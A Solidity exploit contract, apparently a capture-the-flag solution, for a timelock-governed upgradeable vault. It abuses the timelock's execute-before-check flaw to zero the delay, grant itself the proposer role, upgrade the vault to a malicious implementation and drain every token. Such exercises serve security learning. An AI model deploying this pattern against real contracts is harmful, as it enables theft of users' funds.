// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ClimberAttackerVault is UUPSUpgradeable {
    constructor() {
    }

    function withdrawAll(IERC20 token, address receiver) external {
        token.transfer(receiver, token.balanceOf(address(this)));
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}

interface IVault {
    function owner() external view returns (address);
    function upgradeTo(address newImplementation) external;
}

interface ITimelock {
    function PROPOSER_ROLE() external view returns(bytes32);
    function schedule(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt) external;
    function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt) external;
    function updateDelay(uint64 newDelay) external;
    function grantRole(bytes32 role, address account) external;
}

contract ClimberAttacker {
    address public owner;
    IVault public vaultProxy;
    ITimelock public timelock;

    address[] targets = new address[](4);
    uint[] values = new uint[](4);
    bytes[] data = new bytes[](4);
    bytes32 salt = 0;

    constructor(IVault _vaultProxy) {
        owner = msg.sender;
        vaultProxy = _vaultProxy;
        timelock = ITimelock(vaultProxy.owner());
    }

    function attack(IERC20 token) external {
        ClimberAttackerVault newVault = new ClimberAttackerVault();

        // Timelock executes commands before check their status
        // Main command is 0. vaultProxy.upgradeTo(newVault);
        // and for late timelock's check we need:
        // 1. timelock.updateDelay(0);
        // 2. timelock.grantRole(PROPOSER_ROLE, address(this));
        // 3. this.schedule() => timelock.schedule(that command);

        targets[0] = address(vaultProxy);
        values[0] = 0;
        data[0] = abi.encodeWithSelector(IVault.upgradeTo.selector, address(newVault));

        targets[1] = address(timelock);
        values[1] = 0;
        data[1] = abi.encodeWithSelector(ITimelock.updateDelay.selector, 0);

        targets[2] = address(timelock);
        values[2] = 0;
        data[2] = abi.encodeWithSelector(ITimelock.grantRole.selector, timelock.PROPOSER_ROLE(), address(this));

        targets[3] = address(this);
        values[3] = 0;
        data[3] = abi.encodeWithSelector(ClimberAttacker.schedule.selector);

        timelock.execute(targets, values, data, salt);

        ClimberAttackerVault(address(vaultProxy)).withdrawAll(token, owner);
    }

    function schedule() external {
        timelock.schedule(targets, values, data, salt);
    }
}